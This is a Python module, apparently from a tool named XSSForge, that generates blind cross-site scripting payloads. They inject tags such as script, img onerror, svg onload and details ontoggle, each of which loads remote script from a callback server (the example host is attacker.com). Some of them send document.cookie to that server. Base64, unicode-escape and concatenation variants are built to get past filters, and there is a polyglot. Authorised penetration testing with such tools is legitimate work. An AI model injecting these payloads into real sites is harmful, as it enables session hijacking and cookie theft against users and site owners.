"""
Blind XSS Payload Generator for XSSForge.

Generates payloads for blind XSS testing with callback tracking.
"""

import secrets
from dataclasses import dataclass, field


@dataclass
class BlindPayload:
    """A blind XSS payload with tracking."""
    payload: str
    tracking_id: str
    payload_type: str  # script, img, svg, etc.
    description: str = ""


class BlindPayloadGenerator:
    """
    Generates blind XSS payloads with callback tracking.

    Features:
    - Multiple payload types (script src, img onerror, svg, etc.)
    - Unique tracking IDs for each injection point
    - Encoded variants for filter bypass
    """

    def __init__(self, server_url: str):
        """
        Initialize payload generator.

        Args:
            server_url: Base URL of the callback server (e.g., http://attacker.com:8443)
        """
        self.server_url = server_url.rstrip("/")

    def generate_tracking_id(self) -> str:
        """Generate a unique tracking ID."""
        return secrets.token_hex(8)

    def generate_all(self, tracking_id: str | None = None) -> list[BlindPayload]:
        """Generate all blind XSS payload variants."""
        if not tracking_id:
            tracking_id = self.generate_tracking_id()

        payloads = []

        # Script src (most reliable)
        payloads.append(BlindPayload(
            payload=f'<script src="{self.server_url}/x.js?id={tracking_id}"></script>',
            tracking_id=tracking_id,
            payload_type="script_src",
            description="External script load",
        ))

        # Script src with no quotes
        payloads.append(BlindPayload(
            payload=f'<script src={self.server_url}/x.js?id={tracking_id}></script>',
            tracking_id=tracking_id,
            payload_type="script_src_noquote",
            description="External script (no quotes)",
        ))

        # Img onerror with script injection
        payloads.append(BlindPayload(
            payload=f'<img src=x onerror="var s=document.createElement(\'script\');s.src=\'{self.server_url}/x.js?id={tracking_id}\';document.body.appendChild(s)">',
            tracking_id=tracking_id,
            payload_type="img_onerror",
            description="Image onerror callback",
        ))

        # Img onerror simple (image-based callback only)
        payloads.append(BlindPayload(
            payload=f'<img src=x onerror="new Image().src=\'{self.server_url}/callback?id={tracking_id}&c=\'+document.cookie">',
            tracking_id=tracking_id,
            payload_type="img_simple",
            description="Image callback (cookies only)",
        ))

        # SVG onload
        payloads.append(BlindPayload(
            payload=f'<svg onload="var s=document.createElement(\'script\');s.src=\'{self.server_url}/x.js?id={tracking_id}\';document.body.appendChild(s)">',
            tracking_id=tracking_id,
            payload_type="svg_onload",
            description="SVG onload callback",
        ))

        # Body onload (for body context)
        payloads.append(BlindPayload(
            payload=f'<body onload="var s=document.createElement(\'script\');s.src=\'{self.server_url}/x.js?id={tracking_id}\';document.body.appendChild(s)">',
            tracking_id=tracking_id,
            payload_type="body_onload",
            description="Body onload callback",
        ))

        # Input autofocus onfocus
        payloads.append(BlindPayload(
            payload=f'<input onfocus="var s=document.createElement(\'script\');s.src=\'{self.server_url}/x.js?id={tracking_id}\';document.body.appendChild(s)" autofocus>',
            tracking_id=tracking_id,
            payload_type="input_onfocus",
            description="Input autofocus callback",
        ))

        # Details ontoggle
        payloads.append(BlindPayload(
            payload=f'<details open ontoggle="var s=document.createElement(\'script\');s.src=\'{self.server_url}/x.js?id={tracking_id}\';document.body.appendChild(s)">',
            tracking_id=tracking_id,
            payload_type="details_ontoggle",
            description="Details ontoggle callback",
        ))

        # Iframe src (might work in some contexts)
        payloads.append(BlindPayload(
            payload=f'<iframe src="javascript:var s=document.createElement(\'script\');s.src=\'{self.server_url}/x.js?id={tracking_id}\';parent.document.body.appendChild(s)">',
            tracking_id=tracking_id,
            payload_type="iframe_js",
            description="Iframe javascript callback",
        ))

        # Fetch-based (modern browsers)
        payloads.append(BlindPayload(
            payload=f'<img src=x onerror="fetch(\'{self.server_url}/callback?id={tracking_id}&c=\'+document.cookie)">',
            tracking_id=tracking_id,
            payload_type="fetch",
            description="Fetch-based callback",
        ))

        return payloads

    def generate_encoded(self, tracking_id: str | None = None) -> list[BlindPayload]:
        """Generate encoded blind XSS payloads for filter bypass."""
        if not tracking_id:
            tracking_id = self.generate_tracking_id()

        payloads = []

        # Base64 encoded script
        import base64
        script_content = f'var s=document.createElement("script");s.src="{self.server_url}/x.js?id={tracking_id}";document.body.appendChild(s);'
        b64_script = base64.b64encode(script_content.encode()).decode()

        payloads.append(BlindPayload(
            payload=f'<img src=x onerror="eval(atob(\'{b64_script}\'))">',
            tracking_id=tracking_id,
            payload_type="base64",
            description="Base64 encoded callback",
        ))

        # Unicode escape
        server_escaped = "".join(f"\\u{ord(c):04x}" for c in self.server_url)
        payloads.append(BlindPayload(
            payload=f'<img src=x onerror="var s=document.createElement(\'script\');s.src=\'{server_escaped}/x.js?id={tracking_id}\';document.body.appendChild(s)">',
            tracking_id=tracking_id,
            payload_type="unicode",
            description="Unicode escaped callback",
        ))

        # String concatenation
        payloads.append(BlindPayload(
            payload=f'<img src=x onerror="var u=\'{self.server_url}\'+\'/x.js?id={tracking_id}\';var s=document.createElement(\'scr\'+\'ipt\');s.src=u;document.body.appendChild(s)">',
            tracking_id=tracking_id,
            payload_type="concat",
            description="String concatenation bypass",
        ))

        # Template literal
        payloads.append(BlindPayload(
            payload=f'<img src=x onerror=`var s=document.createElement(\'script\');s.src=\'{self.server_url}/x.js?id={tracking_id}\';document.body.appendChild(s)`>',
            tracking_id=tracking_id,
            payload_type="template",
            description="Template literal callback",
        ))

        return payloads

    def generate_polyglot(self, tracking_id: str | None = None) -> BlindPayload:
        """Generate a polyglot blind XSS payload."""
        if not tracking_id:
            tracking_id = self.generate_tracking_id()

        # Polyglot that works in multiple contexts
        payload = f'\'"><img src=x onerror="var s=document.createElement(\'script\');s.src=\'{self.server_url}/x.js?id={tracking_id}\';document.body.appendChild(s)">'

        return BlindPayload(
            payload=payload,
            tracking_id=tracking_id,
            payload_type="polyglot",
            description="Multi-context polyglot callback",
        )


def get_blind_payload(server_url: str, payload_type: str = "script_src") -> BlindPayload:
    """
    Convenience function to get a single blind XSS payload.

    Args:
        server_url: Callback server URL
        payload_type: Type of payload (script_src, img_onerror, svg_onload, etc.)

    Returns:
        BlindPayload with tracking ID
    """
    generator = BlindPayloadGenerator(server_url)
    payloads = generator.generate_all()

    for p in payloads:
        if p.payload_type == payload_type:
            return p

    # Default to script_src
    return payloads[0]


def get_all_blind_payloads(server_url: str) -> list[BlindPayload]:
    """Get all blind XSS payload variants."""
    generator = BlindPayloadGenerator(server_url)
    return generator.generate_all() + generator.generate_encoded()
